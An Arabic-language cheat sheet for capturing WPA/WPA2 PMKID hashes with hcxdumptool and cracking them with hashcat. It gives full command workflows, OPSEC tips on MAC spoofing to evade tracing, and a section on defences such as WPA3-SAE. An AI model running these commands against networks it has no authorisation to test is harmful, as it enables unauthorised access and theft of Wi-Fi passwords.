# hcxdumptool / hcxtools — الدليل الشامل

تعتبر أداة `hcxdumptool` متخصصة في التقاط إطارات (Frames) شبكات Wi-Fi، وهي محسنة بشكل خاص لتنفيذ هجمات **PMKID** (والتي لا تتطلب وجود مستخدم متصل بالشبكة). أما مجموعة أدوات `hcxtools` فهي تُستخدم لتحويل الملفات الملتقطة إلى صيغ متوافقة مع أداة Hashcat لكسر كلمات المرور. معاً، يحل هذا الثنائي محل سير العمل التقليدي (airodump+aireplay) في اختبار اختراق شبكات WPA/WPA2 الحديثة.

## التثبيت (Install)

```terminal
apt install hcxdumptool hcxtools
brew install hcxtools     # تتوفر مجموعة فرعية من الأدوات على نظام macOS
```

*ملاحظة: يتطلب الاستخدام بطاقة شبكة تدعم وضع المراقبة (Monitor Mode) وحقن الحزم (Packet Injection).*

## hcxdumptool — مرحلة الالتقاط (Capture)

```terminal
sudo hcxdumptool -i wlan0mon -o capture.pcapng \
  --enable_status=1 \
  --filterlist_ap=targets.txt --filtermode=2
```

| العلم | الغرض |
|------|---------|
| `-i <iface>` | واجهة الشبكة (يجب أن تكون في وضع المراقبة Monitor Mode) |
| `-o <file>` | ملف المخرجات بصيغة pcapng |
| `--enable_status=1` | عرض حالة العمليات مباشرة على الشاشة |
| `--filterlist_ap` | ملف يحتوي على عناوين MAC المستهدفة (BSSID) |
| `--filtermode=2` | وضع الفلترة (1 = استثناء الماك، 2 = حصر الالتقاط على الماك المذكور) |
| `-c <ch>` | تثبيت القناة (Channel) |
| `-t <sec>` | وقت المهلة (Timeout) |
| `-m <mac>` | تزوير عنوان MAC (Spoofing) |
| `--rds=<n>` | ترتيب عرض البيانات (1=الأقدم، 2=الأحدث، 3=القناة، 4=الإشارة) |
| `--silent` | وضع الصمت: الاستماع فقط دون إرسال حزم أو فصل مستخدمين |

## سير العمل — هجوم PMKID

```terminal
sudo airmon-ng check kill
sudo airmon-ng start wlan0
sudo hcxdumptool -i wlan0mon -o capture.pcapng --enable_status=1
# انتظر — تقوم الأداة بإرسال ASSOCREQ؛ بعض نقاط الوصول تسرب PMKID في حزم EAPOL M1.
# توقف عن طريق Ctrl-C عند ظهور أسطر تحتوي على [+] PMKID.

# تحويل الملف الملتقط لصيغة Hashcat:
hcxpcapngtool -o pmkid.hc22000 -E essidlist capture.pcapng

# البدء بكسر كلمة المرور:
hashcat -m 22000 pmkid.hc22000 rockyou.txt -r rules/best64.rule
```

يدعم وضع `-m 22000` في Hashcat كل من هجمات PMKID ومصافحات EAPOL (Handshakes) في آن واحد.

## hcxtools — أدوات التحويل والمعالجة

| الأداة | الغرض |
|------|---------|
| `hcxpcapngtool` | تحويل ملفات pcapng إلى hc22000 أو hccapx |
| `hcxhashtool` | معالجة ملفات الهاش (تصفية حسب BSSID/ESSID) |
| `hcxessidtool` | استخراج أو تصفية أسماء الشبكات (ESSIDs) |
| `hcxpsktool` | توليد مفاتيح WPA مرشحة بناءً على معطيات معينة |
| `hcxwltool` | توليد قوائم كلمات مرور (Wordlists) بناءً على أسماء الشبكات |
| `hcxeiutool` | محلل لعناصر المعلومات (Information-element analyzer) |

## لماذا يفضل هجوم PMKID على المصافحة الرباعية (4-way handshake)؟

- **لا يتطلب وجود مستخدم**: يتم استخراج الـ PMKID من أول إطار EAPOL ترسلها نقطة الوصول بمجرد محاولة الارتباط بها.
- **لا يحتاج لفصل المستخدمين (Deauth)**: مما يجعل الهجوم أكثر هدوءاً ولا يسبب انقطاع الخدمة عن العملاء.
- **تجاوز حماية الإطارات الإدارية (802.11w)**: حيث أن هذه الحماية تمنع هجمات Deauth ولكنها لا تمنع استخراج PMKID.
- *ملاحظة: بعض نقاط الوصول الحديثة (مثل Aruba و Cisco) لا تسرب PMKID، لذا نعود للطريقة التقليدية بالالتقاط عبر المصافحة.*

## المشاكل الشائعة والحلول

| العرض | الحل |
|---------|-----|
| Tool exits "no monitor mode interface" | تأكد من تفعيل وضع المراقبة عبر `airmon-ng start wlan0` |
| عدم ظهور PMKID بعد وقت طويل | نقطة الوصول لا تسرب الهاش؛ جرب طريقة Deauth-Handshake |
| فشل كسر كلمة المرور | كلمة المرور قوية؛ استخدم `hcxpsktool` لإنشاء قوائم مخصصة أو جرب قوائم أضخم |
| `hcxpcapngtool` says "no hashes" | ملف الالتقاط لا يحتوي على EAPOL أو PMKID؛ أعد عملية الالتقاط |

## منظور المدافع (Defender's perspective)

- إن وجود بروتوكول WPA2-PSK مع ثغرة تسريب PMKID يجعل الشبكة عرضة للكسر بسهولة إذا كانت كلمة المرور ضعيفة.
- **الإجراء الدفاعي**: تعطيل خاصية توليد PMKID في إعدادات نقطة الوصول (تختلف حسب الشركة المصنعة).
- **الانتقال لـ WPA3-SAE**: وهو الحل الأمثل حيث يمنع عمليات الكسر غير المتصلة (Offline Cracking) تماماً.
- يمكن لأنظمة كشف التسلل اللاسلكي (WIDS) رصد أنماط ASSOCREQ غير الطبيعية الصادرة عن "عملاء" يحاولون الاتصال بنقاط وصول متعددة بسرعة.

## أمن العمليات (OPSEC)

- ترسل `hcxdumptool` الحد الأدنى من حركة المرور، مما يجعلها أقل ضجيجاً من `aireplay-ng`.
- استخدم علم `--silent` للاستماع الخامل تماماً (Passive Listening)، حيث يمكنك التقاط PMKID عندما يحاول عملاء حقيقيون الاتصال بالشبكة بشكل طبيعي.
- استخدام تزوير عنوان MAC (Spoofed MAC) يقلل من احتمالية تتبع المهاجم في البيئة المستهدفة.

## أدوات ذات صلة

- **aircrack-ng** — الطريقة التقليدية المعتمدة على المصافحة الرباعية.
- **bettercap wifi.recon** — أداة حديثة وشاملة تتضمن هجمات PMKID.
- **wifite2** — أداة مؤتمتة تجمع بين عدة أدوات في واجهة واحدة.
- **wpaclean** — لتنظيف ملفات الالتقاط من البيانات غير الضرورية قبل البدء بالكسر.
